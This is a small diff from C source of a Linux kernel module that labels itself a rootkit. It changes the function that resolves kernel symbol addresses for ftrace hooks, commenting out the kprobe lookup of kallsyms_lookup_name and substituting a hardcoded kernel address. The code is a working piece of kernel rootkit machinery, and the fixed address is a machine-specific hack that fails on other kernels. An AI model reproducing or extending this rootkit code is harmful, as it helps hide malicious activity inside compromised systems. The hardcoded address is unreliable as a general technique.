@@ -63,7 +63,8 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
     register_kprobe(&kp);
-    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    // kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) 0xffffffffb9b1ff50;
     unregister_kprobe(&kp);
     printk(KERN_INFO "rootkit: kprobe at %p\n", kp.addr);
     // printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
